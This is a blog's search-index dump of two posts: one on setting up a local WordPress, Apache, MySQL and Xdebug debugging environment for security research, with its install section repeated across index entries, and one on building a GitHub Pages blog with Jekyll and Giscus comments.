WordPress This means hackers only need to find one common vulnerability =\u003e they can exploit millions of sites at once Similar to the saying: “fish where the fish are” ","date":"2025-08-21","objectID":"/posts/2025-08-21-wordpress-local-and-debugging/:2:1","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/posts/2025-08-21-wordpress-local-and-debugging/#most-popular"},{"categories":["Web"],"collections":null,"content":"Plugins and Themes WordPress Core has been reviewed for a long time by thousands of developers and researchers, making it very difficult for attackers to compromise directly. However, there are tens of thousands of plugins and themes from various sources with inconsistent quality. Many plugins have poor security coding and are outdated. Hackers just need to scan for outdated versions and exploit them. ","date":"2025-08-21","objectID":"/posts/2025-08-21-wordpress-local-and-debugging/:2:2","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/posts/2025-08-21-wordpress-local-and-debugging/#plugins-and-themes"},{"categories":["Web"],"collections":null,"content":"Setup WordPress for Hacking There are many ways to set up WordPress; searching Google will provide plenty of guides. Here I will set it up on an Ubuntu (22.04) virtual machine: Does not affect real machine services WordPress is relatively lightweight and works well on a VM ","date":"2025-08-21","objectID":"/posts/2025-08-21-wordpress-local-and-debugging/:3:0","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/posts/2025-08-21-wordpress-local-and-debugging/#setup-wordpress-for-hacking"},{"categories":["Web"],"collections":null,"content":"Install and Configure WordPress Install Dependencies Install the full stack required to run WordPress (web server + database + PHP + important extensions): sudo apt install -y apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress Download and install WordPress source into the web directory: # Create folder to store site source code sudo mkdir -p /srv/www # Change ownership to www-data (default user for Apache/Nginx) sudo chown www-data: /srv/www # Download the latest WordPress package and extract it into /srv/www curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www Download a specific version: curl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www Installing from wordpress.org is the most reliable and safest approach: Ubuntu has a wordpress package in its repository, but it is often outdated compared to the official release. The WordPress community only supports installations from the official source. Configure Apache for WordPress Create \u0026 edit /etc/apache2/sites-available/wordpress.conf: sudo nano /etc/apache2/sites-available/wordpress.conf Paste the following content in: \u003cVirtualHost *:80\u003e DocumentRoot /srv/www/wordpress \u003cDirectory /srv/www/wordpress\u003e Options FollowSymLinks AllowOverride Limit Options FileInfo DirectoryIndex index.php Require all granted \u003c/Directory\u003e \u003cDirectory /srv/www/wordpress/wp-content\u003e Options FollowSymLinks Require all granted \u003c/Directory\u003e \u003c/VirtualHost\u003e Enable the site: sudo a2ensite wordpress Enable rewrite module: sudo a2enmod rewrite (Optional) Disable default site: sudo a2dissite 000-default Reload Apache: sudo service apache2 reload Configure Database sudo mysql -u root CREATE DATABASE wordpress; CREATE USER wordpress@localhost IDENTIFIED BY '\u003cyour-password\u003e'; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; FLUSH PRIVILEGES; quit Restart MySQL: sudo service mysql start Configure WordPress to Connect to the Database Copy config file: sudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php Edit database info: sudo -u www-data sed -i 's/database_name_here/wordpress/' /srv/www/wordpress/wp-config.php sudo -u www-data sed -i 's/username_here/wordpress/' /srv/www/wordpress/wp-config.php sudo -u www-data sed -i 's/password_here/\u003cyour-password\u003e/' /srv/www/wordpress/wp-config.php Add secret keys and salts from: https://api.wordpress.org/secret-key/1.1/salt/ sudo nano /srv/www/wordpress/wp-config.php Configure WordPress Visit http://localhost and set site title, username, password, and admin email. ","date":"2025-08-21","objectID":"/posts/2025-08-21-wordpress-local-and-debugging/:3:1","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/posts/2025-08-21-wordpress-local-and-debugging/#install-and-configure-wordpress"},{"categories":["Web"],"collections":null,"content":"Install and Configure WordPress Install Dependencies Install the full stack required to run WordPress (web server + database + PHP + important extensions): sudo apt install -y apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress Download and install WordPress source into the web directory: # Create folder to store site source code sudo mkdir -p /srv/www # Change ownership to www-data (default user for Apache/Nginx) sudo chown www-data: /srv/www # Download the latest WordPress package and extract it into /srv/www curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www Download a specific version: curl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www Installing from wordpress.org is the most reliable and safest approach: Ubuntu has a wordpress package in its repository, but it is often outdated compared to the official release. The WordPress community only supports installations from the official source. Configure Apache for WordPress Create \u0026 edit /etc/apache2/sites-available/wordpress.conf: sudo nano /etc/apache2/sites-available/wordpress.conf Paste the following content in: DocumentRoot /srv/www/wordpress Options FollowSymLinks AllowOverride Limit Options FileInfo DirectoryIndex index.php Require all granted Options FollowSymLinks Require all granted Enable the site: sudo a2ensite wordpress Enable rewrite module: sudo a2enmod rewrite (Optional) Disable default site: sudo a2dissite 000-default Reload Apache: sudo service apache2 reload Configure Database sudo mysql -u root CREATE DATABASE wordpress; CREATE USER wordpress@localhost IDENTIFIED BY ''; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; FLUSH PRIVILEGES; quit Restart MySQL: sudo service mysql start Configure WordPress to Connect to the Database Copy config file: sudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php Edit database info: sudo -u www-data sed -i 's/database_name_here/wordpress/' /srv/www/wordpress/wp-config.php sudo -u www-data sed -i 's/username_here/wordpress/' /srv/www/wordpress/wp-config.php sudo -u www-data sed -i 's/password_here//' /srv/www/wordpress/wp-config.php Add secret keys and salts from: https://api.wordpress.org/secret-key/1.1/salt/ sudo nano /srv/www/wordpress/wp-config.php Configure WordPress Visit http://localhost and set site title, username, password, and admin email. ","date":"2025-08-21","objectID":"/posts/2025-08-21-wordpress-local-and-debugging/:3:1","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/posts/2025-08-21-wordpress-local-and-debugging/#install-dependencies"},{"categories":["Web"],"collections":null,"content":"Install and Configure WordPress Install Dependencies Install the full stack required to run WordPress (web server + database + PHP + important extensions): sudo apt install -y apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress Download and install WordPress source into the web directory: # Create folder to store site source code sudo mkdir -p /srv/www # Change ownership to www-data (default user for Apache/Nginx) sudo chown www-data: /srv/www # Download the latest WordPress package and extract it into /srv/www curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www Download a specific version: curl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www Installing from wordpress.org is the most reliable and safest approach: Ubuntu has a wordpress package in its repository, but it is often outdated compared to the official release. The WordPress community only supports installations from the official source. Configure Apache for WordPress Create \u0026 edit /etc/apache2/sites-available/wordpress.conf: sudo nano /etc/apache2/sites-available/wordpress.conf Paste the following content in: DocumentRoot /srv/www/wordpress Options FollowSymLinks AllowOverride Limit Options FileInfo DirectoryIndex index.php Require all granted Options FollowSymLinks Require all granted Enable the site: sudo a2ensite wordpress Enable rewrite module: sudo a2enmod rewrite (Optional) Disable default site: sudo a2dissite 000-default Reload Apache: sudo service apache2 reload Configure Database sudo mysql -u root CREATE DATABASE wordpress; CREATE USER wordpress@localhost IDENTIFIED BY ''; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; FLUSH PRIVILEGES; quit Restart MySQL: sudo service mysql start Configure WordPress to Connect to the Database Copy config file: sudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php Edit database info: sudo -u www-data sed -i 's/database_name_here/wordpress/' /srv/www/wordpress/wp-config.php sudo -u www-data sed -i 's/username_here/wordpress/' /srv/www/wordpress/wp-config.php sudo -u www-data sed -i 's/password_here//' /srv/www/wordpress/wp-config.php Add secret keys and salts from: https://api.wordpress.org/secret-key/1.1/salt/ sudo nano /srv/www/wordpress/wp-config.php Configure WordPress Visit http://localhost and set site title, username, password, and admin email. ","date":"2025-08-21","objectID":"/posts/2025-08-21-wordpress-local-and-debugging/:3:1","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/posts/2025-08-21-wordpress-local-and-debugging/#install-wordpress"},{"categories":["Web"],"collections":null,"content":"Install and Configure WordPress Install Dependencies Install the full stack required to run WordPress (web server + database + PHP + important extensions): sudo apt install -y apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress Download and install WordPress source into the web directory: # Create folder to store site source code sudo mkdir -p /srv/www # Change ownership to www-data (default user for Apache/Nginx) sudo chown www-data: /srv/www # Download the latest WordPress package and extract it into /srv/www curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www Download a specific version: curl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www Installing from wordpress.org is the most reliable and safest approach: Ubuntu has a wordpress package in its repository, but it is often outdated compared to the official release. The WordPress community only supports installations from the official source. Configure Apache for WordPress Create \u0026 edit /etc/apache2/sites-available/wordpress.conf: sudo nano /etc/apache2/sites-available/wordpress.conf Paste the following content in: DocumentRoot /srv/www/wordpress Options FollowSymLinks AllowOverride Limit Options FileInfo DirectoryIndex index.php Require all granted Options FollowSymLinks Require all granted Enable the site: sudo a2ensite wordpress Enable rewrite module: sudo a2enmod rewrite (Optional) Disable default site: sudo a2dissite 000-default Reload Apache: sudo service apache2 reload Configure Database sudo mysql -u root CREATE DATABASE wordpress; CREATE USER wordpress@localhost IDENTIFIED BY ''; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; FLUSH PRIVILEGES; quit Restart MySQL: sudo service mysql start Configure WordPress to Connect to the Database Copy config file: sudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php Edit database info: sudo -u www-data sed -i 's/database_name_here/wordpress/' /srv/www/wordpress/wp-config.php sudo -u www-data sed -i 's/username_here/wordpress/' /srv/www/wordpress/wp-config.php sudo -u www-data sed -i 's/password_here//' /srv/www/wordpress/wp-config.php Add secret keys and salts from: https://api.wordpress.org/secret-key/1.1/salt/ sudo nano /srv/www/wordpress/wp-config.php Configure WordPress Visit http://localhost and set site title, username, password, and admin email. ","date":"2025-08-21","objectID":"/posts/2025-08-21-wordpress-local-and-debugging/:3:1","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/posts/2025-08-21-wordpress-local-and-debugging/#configure-apache-for-wordpress"},{"categories":["Web"],"collections":null,"content":"Install and Configure WordPress Install Dependencies Install the full stack required to run WordPress (web server + database + PHP + important extensions): sudo apt install -y apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress Download and install WordPress source into the web directory: # Create folder to store site source code sudo mkdir -p /srv/www # Change ownership to www-data (default user for Apache/Nginx) sudo chown www-data: /srv/www # Download the latest WordPress package and extract it into /srv/www curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www Download a specific version: curl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www Installing from wordpress.org is the most reliable and safest approach: Ubuntu has a wordpress package in its repository, but it is often outdated compared to the official release. The WordPress community only supports installations from the official source. Configure Apache for WordPress Create \u0026 edit /etc/apache2/sites-available/wordpress.conf: sudo nano /etc/apache2/sites-available/wordpress.conf Paste the following content in: DocumentRoot /srv/www/wordpress Options FollowSymLinks AllowOverride Limit Options FileInfo DirectoryIndex index.php Require all granted Options FollowSymLinks Require all granted Enable the site: sudo a2ensite wordpress Enable rewrite module: sudo a2enmod rewrite (Optional) Disable default site: sudo a2dissite 000-default Reload Apache: sudo service apache2 reload Configure Database sudo mysql -u root CREATE DATABASE wordpress; CREATE USER wordpress@localhost IDENTIFIED BY ''; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; FLUSH PRIVILEGES; quit Restart MySQL: sudo service mysql start Configure WordPress to Connect to the Database Copy config file: sudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php Edit database info: sudo -u www-data sed -i 's/database_name_here/wordpress/' /srv/www/wordpress/wp-config.php sudo -u www-data sed -i 's/username_here/wordpress/' /srv/www/wordpress/wp-config.php sudo -u www-data sed -i 's/password_here//' /srv/www/wordpress/wp-config.php Add secret keys and salts from: https://api.wordpress.org/secret-key/1.1/salt/ sudo nano /srv/www/wordpress/wp-config.php Configure WordPress Visit http://localhost and set site title, username, password, and admin email. ","date":"2025-08-21","objectID":"/posts/2025-08-21-wordpress-local-and-debugging/:3:1","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/posts/2025-08-21-wordpress-local-and-debugging/#configure-database"},{"categories":["Web"],"collections":null,"content":"Install and Configure WordPress Install Dependencies Install the full stack required to run WordPress (web server + database + PHP + important extensions): sudo apt install -y apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress Download and install WordPress source into the web directory: # Create folder to store site source code sudo mkdir -p /srv/www # Change ownership to www-data (default user for Apache/Nginx) sudo chown www-data: /srv/www # Download the latest WordPress package and extract it into /srv/www curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www Download a specific version: curl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www Installing from wordpress.org is the most reliable and safest approach: Ubuntu has a wordpress package in its repository, but it is often outdated compared to the official release. The WordPress community only supports installations from the official source. Configure Apache for WordPress Create \u0026 edit /etc/apache2/sites-available/wordpress.conf: sudo nano /etc/apache2/sites-available/wordpress.conf Paste the following content in: DocumentRoot /srv/www/wordpress Options FollowSymLinks AllowOverride Limit Options FileInfo DirectoryIndex index.php Require all granted Options FollowSymLinks Require all granted Enable the site: sudo a2ensite wordpress Enable rewrite module: sudo a2enmod rewrite (Optional) Disable default site: sudo a2dissite 000-default Reload Apache: sudo service apache2 reload Configure Database sudo mysql -u root CREATE DATABASE wordpress; CREATE USER wordpress@localhost IDENTIFIED BY ''; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; FLUSH PRIVILEGES; quit Restart MySQL: sudo service mysql start Configure WordPress to Connect to the Database Copy config file: sudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php Edit database info: sudo -u www-data sed -i 's/database_name_here/wordpress/' /srv/www/wordpress/wp-config.php sudo -u www-data sed -i 's/username_here/wordpress/' /srv/www/wordpress/wp-config.php sudo -u www-data sed -i 's/password_here//' /srv/www/wordpress/wp-config.php Add secret keys and salts from: https://api.wordpress.org/secret-key/1.1/salt/ sudo nano /srv/www/wordpress/wp-config.php Configure WordPress Visit http://localhost and set site title, username, password, and admin email. ","date":"2025-08-21","objectID":"/posts/2025-08-21-wordpress-local-and-debugging/:3:1","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/posts/2025-08-21-wordpress-local-and-debugging/#configure-wordpress-to-connect-to-the-database"},{"categories":["Web"],"collections":null,"content":"Install and Configure WordPress Install Dependencies Install the full stack required to run WordPress (web server + database + PHP + important extensions): sudo apt install -y apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress Download and install WordPress source into the web directory: # Create folder to store site source code sudo mkdir -p /srv/www # Change ownership to www-data (default user for Apache/Nginx) sudo chown www-data: /srv/www # Download the latest WordPress package and extract it into /srv/www curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www Download a specific version: curl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www Installing from wordpress.org is the most reliable and safest approach: Ubuntu has a wordpress package in its repository, but it is often outdated compared to the official release. The WordPress community only supports installations from the official source. Configure Apache for WordPress Create \u0026 edit /etc/apache2/sites-available/wordpress.conf: sudo nano /etc/apache2/sites-available/wordpress.conf Paste the following content in: DocumentRoot /srv/www/wordpress Options FollowSymLinks AllowOverride Limit Options FileInfo DirectoryIndex index.php Require all granted Options FollowSymLinks Require all granted Enable the site: sudo a2ensite wordpress Enable rewrite module: sudo a2enmod rewrite (Optional) Disable default site: sudo a2dissite 000-default Reload Apache: sudo service apache2 reload Configure Database sudo mysql -u root CREATE DATABASE wordpress; CREATE USER wordpress@localhost IDENTIFIED BY ''; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; FLUSH PRIVILEGES; quit Restart MySQL: sudo service mysql start Configure WordPress to Connect to the Database Copy config file: sudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php Edit database info: sudo -u www-data sed -i 's/database_name_here/wordpress/' /srv/www/wordpress/wp-config.php sudo -u www-data sed -i 's/username_here/wordpress/' /srv/www/wordpress/wp-config.php sudo -u www-data sed -i 's/password_here//' /srv/www/wordpress/wp-config.php Add secret keys and salts from: https://api.wordpress.org/secret-key/1.1/salt/ sudo nano /srv/www/wordpress/wp-config.php Configure WordPress Visit http://localhost and set site title, username, password, and admin email. ","date":"2025-08-21","objectID":"/posts/2025-08-21-wordpress-local-and-debugging/:3:1","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/posts/2025-08-21-wordpress-local-and-debugging/#configure-wordpress"},{"categories":["Web"],"collections":null,"content":"Setup Debug on VSCode Add PHP Debug Extension on VSCode Go to Extensions (Ctrl+Shift+X) → search PHP Debug (by Felix Becker) → Install. Install Xdebug on Ubuntu sudo apt install php-xdebug -y Check installation: php -v Configure Xdebug sudo nano /etc/php/\u003cversion\u003e/apache2/php.ini Append: zend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Restart Apache: sudo systemctl restart apache2 Configure VSCode launch.json Open WordPress folder in VSCode: code /srv/www/wordpress Create .vscode/launch.json: ","date":"2025-08-21","objectID":"/posts/2025-08-21-wordpress-local-and-debugging/:3:2","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/posts/2025-08-21-wordpress-local-and-debugging/#setup-debug-on-vscode"},{"categories":["Web"],"collections":null,"content":"Setup Debug on VSCode Add PHP Debug Extension on VSCode Go to Extensions (Ctrl+Shift+X) → search PHP Debug (by Felix Becker) → Install. Install Xdebug on Ubuntu sudo apt install php-xdebug -y Check installation: php -v Configure Xdebug sudo nano /etc/php//apache2/php.ini Append: zend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Restart Apache: sudo systemctl restart apache2 Configure VSCode launch.json Open WordPress folder in VSCode: code /srv/www/wordpress Create .vscode/launch.json: ","date":"2025-08-21","objectID":"/posts/2025-08-21-wordpress-local-and-debugging/:3:2","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/posts/2025-08-21-wordpress-local-and-debugging/#add-php-debug-extension-on-vscode"},{"categories":["Web"],"collections":null,"content":"Setup Debug on VSCode Add PHP Debug Extension on VSCode Go to Extensions (Ctrl+Shift+X) → search PHP Debug (by Felix Becker) → Install. Install Xdebug on Ubuntu sudo apt install php-xdebug -y Check installation: php -v Configure Xdebug sudo nano /etc/php//apache2/php.ini Append: zend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Restart Apache: sudo systemctl restart apache2 Configure VSCode launch.json Open WordPress folder in VSCode: code /srv/www/wordpress Create .vscode/launch.json: ","date":"2025-08-21","objectID":"/posts/2025-08-21-wordpress-local-and-debugging/:3:2","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/posts/2025-08-21-wordpress-local-and-debugging/#install-xdebug-on-ubuntu"},{"categories":["Web"],"collections":null,"content":"Setup Debug on VSCode Add PHP Debug Extension on VSCode Go to Extensions (Ctrl+Shift+X) → search PHP Debug (by Felix Becker) → Install. Install Xdebug on Ubuntu sudo apt install php-xdebug -y Check installation: php -v Configure Xdebug sudo nano /etc/php//apache2/php.ini Append: zend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Restart Apache: sudo systemctl restart apache2 Configure VSCode launch.json Open WordPress folder in VSCode: code /srv/www/wordpress Create .vscode/launch.json: ","date":"2025-08-21","objectID":"/posts/2025-08-21-wordpress-local-and-debugging/:3:2","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/posts/2025-08-21-wordpress-local-and-debugging/#configure-xdebug"},{"categories":["Web"],"collections":null,"content":"Setup Debug on VSCode Add PHP Debug Extension on VSCode Go to Extensions (Ctrl+Shift+X) → search PHP Debug (by Felix Becker) → Install. Install Xdebug on Ubuntu sudo apt install php-xdebug -y Check installation: php -v Configure Xdebug sudo nano /etc/php//apache2/php.ini Append: zend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Restart Apache: sudo systemctl restart apache2 Configure VSCode launch.json Open WordPress folder in VSCode: code /srv/www/wordpress Create .vscode/launch.json: ","date":"2025-08-21","objectID":"/posts/2025-08-21-wordpress-local-and-debugging/:3:2","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/posts/2025-08-21-wordpress-local-and-debugging/#configure-vscode-launchjson"},{"categories":["Web"],"collections":null,"content":"Extend ","date":"2025-08-21","objectID":"/posts/2025-08-21-wordpress-local-and-debugging/:4:0","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/posts/2025-08-21-wordpress-local-and-debugging/#extend"},{"categories":["Web"],"collections":null,"content":"Required Version Each WordPress version usually requires a specific PHP version. Always check compatibility. ","date":"2025-08-21","objectID":"/posts/2025-08-21-wordpress-local-and-debugging/:4:1","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/posts/2025-08-21-wordpress-local-and-debugging/#required-version"},{"categories":["Web"],"collections":null,"content":"WordPress Auto Update Since WordPress 3.7 (2013), WordPress supports automatic background updates for: Security releases Maintenance releases (Major versions require explicit opt-in) To disable auto updates, add to wp-config.php: define( 'WP_AUTO_UPDATE_CORE', false ); ","date":"2025-08-21","objectID":"/posts/2025-08-21-wordpress-local-and-debugging/:4:2","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/posts/2025-08-21-wordpress-local-and-debugging/#wordpress-auto-update"},{"categories":["Web"],"collections":null,"content":"Increase Plugin Upload Size Paste below content into php.ini file. upload_max_filesize = 64M post_max_size = 64M memory_limit = 128M max_execution_time = 300 max_input_time = 300 ","date":"2025-08-21","objectID":"/posts/2025-08-21-wordpress-local-and-debugging/:4:3","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/posts/2025-08-21-wordpress-local-and-debugging/#increase-plugin-upload-size"},{"categories":["Web"],"collections":null,"content":"How to create your personal blog using Github Pages with \"comment\" feature","date":"2025-08-19","objectID":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/"},{"categories":["Web"],"collections":null,"content":"When starting a personal blog, there are three tools you should know: GitHub Pages, Jekyll, and Giscus. Github Pages: A free service from GitHub that allows you to deploy static websites directly from a repository. Just push your code to GitHub, and your blog will automatically go live on the Internet without needing your own server. Jekyll: A static site generator integrated with GitHub Pages. Jekyll makes it easy to create blogs from Markdown files, organize content using templates, and apply ready-to-use themes. Giscus: A modern comment system based on GitHub Discussions. Instead of using external services like Disqus, you can leverage GitHub to manage comments, keeping it lightweight and developer-friendly. ","date":"2025-08-19","objectID":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:0:0","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/#"},{"categories":["Web"],"collections":null,"content":"Requirements A Github account Basic knowledge of Markdown ","date":"2025-08-19","objectID":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:1:0","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/#requirements"},{"categories":["Web"],"collections":null,"content":"Creating a Site Repository Here, I use the Chirpy theme, a popular theme for GitHub Pages optimized for personal or technical blogging. Steps: Log in to Github and go to the starter. Instead of forking, click Use this template and select Create a new repository to automatically create a Site Repository. Name the new repository \u003cusername\u003e.github.io, replacing \u003cusername\u003e with your GitHub username. ","date":"2025-08-19","objectID":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:2:0","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/#creating-a-site-repository"},{"categories":["Web"],"collections":null,"content":"Setting up the Environment There are two main reasons to set up a local development environment for your blog: After pushing code to the repository, GitHub Actions takes time to run before building and rendering the site on GitHub Pages. By developing directly on your local machine, you can see changes instantly—faster and more convenient. ","date":"2025-08-19","objectID":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:3:0","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/#setting-up-the-environment"},{"categories":["Web"],"collections":null,"content":"Using Dev Containers (Recommended for Windows) Dev Containers provide an isolated environment via Docker, preventing conflicts with your system and ensuring all dependencies are managed inside the container. Steps: Install Docker: On Windows/macOS: install Docker Desktop. On Linux: install Docker Engine. Install VS Code and the Dev Containers extension. Clone the repository: If using Docker Desktop: open VS Code and clone the repo in a container volume. If using Docker Engine: clone the repo locally, then open it in a container in VS Code. Wait for the Dev Containers setup process to complete. ","date":"2025-08-19","objectID":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:3:1","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/#using-dev-containers-recommended-for-windows"},{"categories":["Web"],"collections":null,"content":"Setting up Natively (Recommended for Unix-like OS) For Unix-like systems (Linux, macOS), you can set up the environment directly (natively) for better performance. Dev Containers are still available as an alternative. Steps: Follow the Jekyll installation guide and ensure Git is installed. Clone the repository locally. If you forked the theme, install Node.js and run bash tools/init.sh in the root folder to initialize the repo. Run the following commands in the root folder to install gems into ./vendor/bundle/ within the project—no need for sudo and no changes to /var/lib/gems.. bundle config set --local path 'vendor/bundle' bundle install ","date":"2025-08-19","objectID":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:3:2","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/#setting-up-natively-recommended-for-unix-like-os"},{"categories":["Web"],"collections":null,"content":"Usage ","date":"2025-08-19","objectID":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:4:0","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/#usage"},{"categories":["Web"],"collections":null,"content":"Start the Jekyll Server To run the site locally, use: bundle exec jekyll s ","date":"2025-08-19","objectID":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:4:1","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/#start-the-jekyll-server"},{"categories":["Web"],"collections":null,"content":"Configuration Some variables to configure in _config.yml include: lang: set the website language url: your website URL title: main title shown under the avatar tagline: subtitle or site description avatar: supports local and CORS resources, including gif ","date":"2025-08-19","objectID":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:4:2","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/#configuration"},{"categories":["Web"],"collections":null,"content":"Comment feature via Giscus We’ll use Giscus as the comment system. Other free alternatives include Disqus and Utterances. Steps: Install giscus on GitHub. In your repository Settings, go to General and enable Discussions so giscus can store comments. Enter the repository name \u003cusername\u003e/\u003cusername\u003e.github.io. A green checkmark will appear when requirements are met. Choose the discussion category and topic for your site. Configure giscus in _config.yml: provider: set to giscus giscus: map the variables you set on giscus to the giscus section 